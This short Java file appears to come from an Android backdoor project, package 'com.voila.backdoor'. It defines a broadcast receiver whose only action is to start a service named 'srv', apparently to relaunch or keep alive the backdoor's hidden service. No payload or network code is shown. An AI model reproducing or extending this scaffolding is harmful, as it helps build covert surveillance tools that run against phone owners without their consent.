package com.voila.backdoor;
import android.content.*;

public class receiver extends BroadcastReceiver
{

	@Override
	public void onReceive(Context p1, Intent p2)
	{
		// TODO: Implement this method
		Intent i=new Intent(p1,srv.class);
		p1.startService(i);
	}
}
